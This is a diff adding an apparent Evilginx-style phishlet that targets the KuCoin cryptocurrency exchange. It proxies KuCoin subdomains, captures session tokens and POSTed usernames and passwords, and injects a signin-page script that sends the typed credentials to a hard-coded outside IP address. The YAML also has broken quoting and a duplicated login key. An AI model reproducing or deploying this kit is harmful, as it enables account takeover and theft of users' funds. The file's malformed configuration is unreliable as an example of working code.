@@ -1,0 +1,70 @@
+author: 'Rencora'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'passport', orig_sub: 'passport', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: 'api', orig_sub: 'api', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: 'ws-api', orig_sub: 'ws-api', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: 'push-socketio', orig_sub: 'push-socketio', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: 'api-futures', orig_sub: 'api-futures', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'kucoin.com', session: true, is_landing: true, auto_filter: true}
+  - { phish_sub: 'assets', orig_sub: 'assets', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: 'campagnesclick.e', orig_sub: 'campagnesclick.e', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}    
+  - { phish_sub: 'support', orig_sub: 'support', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'assets-v2', orig_sub: 'assets-v2', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}
+          
+sub_filters: 
+  - { triggers_on: 'passport.kucoin.com', orig_sub: 'passport', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { Triggers_on: 'api.kucoin.com', orig_sub: 'api', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: [text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
+  - { Triggers_on: 'www.kucoin.com', orig_sub: 'www', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: [text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
+auth_tokens:
+  - domain: 'kucoin.com'
+    keys: ['x-bullet-token, kucoinv2_bulletTokenKeyPrivate, kucoinv2_bulletTokenUidKey, kucoinv2_clientId, kucoinv2_login_key']
+
+credentials:
+  username:
+    key: 'account'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.kucoin.com'
+  path: '/ucenter/signin'
+
+
+login:
+  username: user
+  password: pass
+  url: https://www.kucoin.com/ucenter/signin
+
+js_inject:
+  - trigger: 'signin'
+    script: |
+      document.addEventListener('DOMContentLoaded', function() {
+        const inputs = document.querySelectorAll('.KuxInput-input');
+        if (inputs.length >= 2) {
+          const userInput = inputs[0]; // account
+          const passInput = inputs[1]; // Password
+
+          const loginBtn = document.querySelector('button.subButton');
+
+          if (loginBtn) {
+            loginBtn.addEventListener('click', function() {
+              const u = userInput.value;
+              const p = passInput.value;
+
+              // Stuur gegevens naar jouw server
+              const img = new Image();
+              img.src = 'https://164.92.147.118:8080/log?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p);
+            });
+          } else {
+            console.warn('Loginknop niet gevonden.');
+          }
+        } else {
+          console.warn('Niet genoeg inputvelden gevonden.');
+        }
+      });
